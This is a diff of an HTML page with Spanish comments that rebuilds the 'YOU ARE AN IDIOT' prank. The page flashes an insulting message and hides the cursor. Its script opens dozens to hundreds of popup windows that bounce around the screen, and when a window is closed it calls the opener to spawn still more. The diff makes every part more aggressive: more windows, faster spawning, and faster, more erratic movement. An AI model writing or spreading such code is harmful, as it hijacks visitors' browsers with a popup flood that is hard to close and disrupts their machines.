@@ -6,37 +6,38 @@
 <style>
 *{margin:0;padding:0}
 body{background:#fff;overflow:hidden;cursor:none;width:100vw;height:100vh}
-h2{font-size:18px;font-family:Arial;text-align:center;margin-top:40%;animation:f .1s infinite}
-@keyframes f{0%,100%{opacity:1}50%{opacity:0}}
+h2{font-size:18px;font-family:Arial;text-align:center;margin-top:40%;animation:f .08s infinite}
+@keyframes f{0%{color:#f00}20%{color:#0f0}40%{color:#00f}60%{color:#ff0}80%{color:#f0f}100%{color:#0ff}}
 </style>
 </head>
-<body onunload="if(window.opener&&window.opener.procreate)window.opener.procreate()">
+<body>
 
 <h2>YOU ARE AN IDIOT</h2>
 
 <script>
-// Esta ventana también dispara popups desde su propio contexto
 var totalLocal = 0;
 
 function abrirDesdeAqui() {
-    if (totalLocal > 100) return;
+    if (totalLocal > 200) return;
     totalLocal++;
     try {
-        var p = window.open('open.html', 'sub_' + Date.now() + '_' + Math.random(),
-            'width=180,height=175,left=' + (Math.random()*screen.width) + ',top=' + (Math.random()*screen.height));
-        if (p) {
-            // Hacerla bailar
+        var nombre = 'sub_' + Date.now() + '_' + Math.random().toString(36).substr(2,8);
+        var p = window.open('open.html', nombre,
+            'width=180,height=175,left=' + (Math.random()*screen.width) + 
+            ',top=' + (Math.random()*screen.height));
+        if (p && !p.closed) {
             (function(pp) {
                 var x = Math.random()*screen.width, y = Math.random()*screen.height;
-                var dx = (Math.random()-0.5)*25, dy = (Math.random()-0.5)*25;
+                var dx = (Math.random()-0.5)*35, dy = (Math.random()-0.5)*35;
                 function baila() {
                     if (!pp || pp.closed) return;
                     try {
                         x+=dx; y+=dy;
                         if(x<0||x>screen.width-180)dx*=-1;
                         if(y<0||y>screen.height-175)dy*=-1;
+                        if(Math.random()<0.04){dx=(Math.random()-0.5)*45;dy=(Math.random()-0.5)*45;}
                         pp.moveTo(Math.round(x),Math.round(y));
-                        setTimeout(baila, 10);
+                        setTimeout(baila, 8);
                     } catch(e) { setTimeout(baila, 100); }
                 }
                 baila();
@@ -45,15 +46,15 @@ function abrirDesdeAqui() {
     } catch(e) {}
 }
 
-// Abrir más desde aquí
+// Abrir 50 hijas
 for (var i = 0; i < 50; i++) {
-    setTimeout(abrirDesdeAqui, i * 30);
+    setTimeout(abrirDesdeAqui, i * 20);
 }
 
-// Y seguir abriendo
-setInterval(abrirDesdeAqui, 200);
+// Seguir abriendo
+setInterval(abrirDesdeAqui, 150);
 
-// Al cerrar, avisar al padre
+// Al cerrar, explotar al padre
 window.onunload = function() {
     if (window.opener && window.opener.procreate) {
         window.opener.procreate();
